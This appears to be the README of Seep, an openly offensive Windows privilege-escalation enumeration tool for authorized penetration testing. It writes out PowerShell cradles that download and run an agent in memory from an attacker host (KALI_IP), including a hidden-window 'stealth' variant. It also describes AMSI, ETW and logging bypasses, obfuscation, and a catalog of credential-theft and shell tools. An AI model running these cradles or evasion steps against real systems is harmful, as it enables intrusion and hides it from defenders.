<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Seep/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Seep/main/docs/assets/logo-light.svg">
  <img alt="Seep" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Seep/main/docs/assets/logo-dark.svg" width="420">
</picture>

![Python](https://img.shields.io/badge/Python-3.9+-3776AB?logo=python&logoColor=white)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**Windows privilege escalation enumeration framework with fileless agent, 16 checks, 97 tools, and MITRE ATT&CK mapping**

Water finds every crack -- so does Seep. Identifies misconfigurations, credential exposures, and escalation paths across 16 enumeration checks with 97 tools in 7 categories, MITRE ATT&CK-mapped recommendations, and single-file HTML reports -- all from a fileless agent.

> **Authorization Required**: This tool is designed exclusively for authorized security testing with explicit written permission. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

</div>

---

## Quick Start

### Prerequisites

- **Python** 3.9+ on the attack box (Kali, etc.)
- **PowerShell** 3.0+ on the target (Windows 8+ / Server 2012+)

### Install

```bash
# pipx (recommended -- isolated environment)
pipx install git+https://github.com/Real-Fruit-Snacks/Seep.git

# Or from a local clone
git clone https://github.com/Real-Fruit-Snacks/Seep.git
cd Seep && pipx install .
```

### Run

```bash
# Initialize workspace and start server
seep init --workdir /tmp/op1
seep serve --workdir /tmp/op1

# On target (server prints ready-to-use cradles with auth tokens)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')"

# Generate report from uploaded results
seep report /tmp/op1/results/results_*.json --format html --output report.html
```

> Default HTTP port is `80` (agent delivery + tool downloads) with upload on port `8000`. Override with `--port` and `--upload-port`. Use `--tls` for HTTPS.

---

## Features

### 16 Enumeration Checks

Modular PowerShell check modules producing structured JSON findings with severity ratings:

```bash
# Full agent (all 16 checks)
seep compose --output agent.ps1

# Minimal agent for quick triage
seep compose --checks system_info,user_privileges,quick_wins --output quick.ps1

# Obfuscated agent
seep compose --obfuscate --output obf_agent.ps1
```

Checks include system info, token privileges, network, patches, quick wins, unattend files, web configs, services, scheduled tasks, autoruns, AlwaysInstallElevated, software inventory, processes, DLL hijack, directory tree, and registry secrets.

### 97-Tool Catalog

Organized across 7 categories with SHA256 integrity verification and self-hosted distribution via GitHub Releases:

```bash
# List all tools
seep catalog list

# Filter by category
seep catalog list --category TokenAbuse

# Download everything with verification
seep catalog download --all --workdir /tmp/op1

# Verify integrity
seep catalog verify --workdir /tmp/op1
```

| Category | Count | Representative Tools |
|---|---|---|
| Enumeration | 27 | WinPEAS, SharpUp, Seatbelt, Watson |
| Credentials | 12 | Mimikatz, LaZagne, SharpDPAPI, Rubeus |
| TokenAbuse | 10 | PrintSpoofer, GodPotato, JuicyPotato |
| AD | 16 | SharpHound, Certify, Whisker, PowerView |
| Tunneling | 9 | Chisel, Ligolo-ng, socat, netcat |
| Impacket | 18 | secretsdump, psexec, wmiexec, ntlmrelayx |
| Shells | 5 | Nishang, PHP shells, netcat variants |

### MITRE ATT&CK Recommendations

Every finding maps to ATT&CK techniques with actionable exploitation guidance -- tool suggestions, example commands, and risk ratings sorted by severity.

### Fileless Execution

Agent runs entirely in memory via IEX cradle. Results are AES-256-CBC encrypted, compressed, and uploaded over HTTP. AMSI/ETW/Script Block Logging bypassed automatically. Zero disk footprint:

```bash
# Stealth variant -- no profile, hidden window
powershell -ep bypass -NoP -W Hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')"
```

### Single-File HTML Reports

Dark-themed, self-contained HTML -- no CDN, no external requests. Executive summary, per-finding detail with evidence, remediation guidance, and recommended tools:

```bash
# HTML report
seep report results.json --format html --output report.html

# Markdown report
seep report results.json --format md --output report.md

# JSON summary
seep report results.json --format json
```

### Agent Obfuscation

Cherry-pick checks with `--checks` / `--exclude`. Apply identifier randomization with `--obfuscate` -- function names, variables, HTTP headers, and check prefixes are all randomized using CSPRNG.

### OPSEC Protections

| Layer | Protection |
|---|---|
| Pre-download | AMSI bypass in cradle |
| Runtime | ETW + Script Block Logging disabled |
| Network | IIS server header spoofing, benign index page |
| Auth | Token-gated endpoints (404 on failure, not 401/403) |
| Transport | AES-256-CBC encryption with GZip compression |
| Identity | CSPRNG identifier randomization |
| Disk | Fileless by default (IEX cradle, in-memory execution) |

---

## Architecture

```
server/
├── cli.py                        # Click-style CLI (init, serve, catalog, compose, report)
├── agent/
│   ├── checks/                   # 16 PowerShell check modules with metadata headers
│   ├── templates/                # Agent wrapper (Invoke-Seep entry point)
│   └── composer.py               # Assembles checks into single .ps1, identifier randomization
├── catalog/
│   ├── tools.yaml                # 97 tool definitions (SHA256, categories, MITRE triggers)
│   └── manager.py                # Download, verify, symlinks, update check
├── http/
│   ├── serve.py                  # Unified HTTP handler (agent delivery, tool serving, upload)
│   └── tls.py                    # Self-signed cert generation
├── results/
│   └── parser.py                 # JSON/ZIP upload parsing, schema validation
└── report/
    ├── recommendations.py        # Finding-to-tool mapping with MITRE ATT&CK
    └── generator.py              # HTML, Markdown, JSON report generation
```

Two-component architecture: Python CLI on the attack box orchestrates everything, while a composed PowerShell agent runs on the target and reports back.

---

## Platform Support

| Capability | Linux (Attack Box) | Windows (Target) |
|---|---|---|
| CLI Server | Full | Full |
| Agent Execution | N/A | PowerShell 3.0+ (Windows 8+) |
| Tool Catalog | Full (download + serve) | N/A |
| TLS Server | Full | Full |
| Report Generation | Full | Full |
| AMSI/ETW Bypass | N/A | Full |

---

## Security

Report security issues via [GitHub Security Advisories](https://github.com/Real-Fruit-Snacks/Seep/security/advisories/new) (preferred) or private disclosure to maintainers. Responsible disclosure timeline: 90 days. Do not open public issues for vulnerabilities.

Seep does **not**:

- Exploit discovered misconfigurations -- enumerates only
- Maintain persistent access -- one-shot agent with result upload
- Destroy evidence or tamper with logs
- Guarantee evasion -- AMSI/ETW bypasses may be detected by advanced solutions

---

## License

[MIT](LICENSE) -- Copyright 2026 Real-Fruit-Snacks
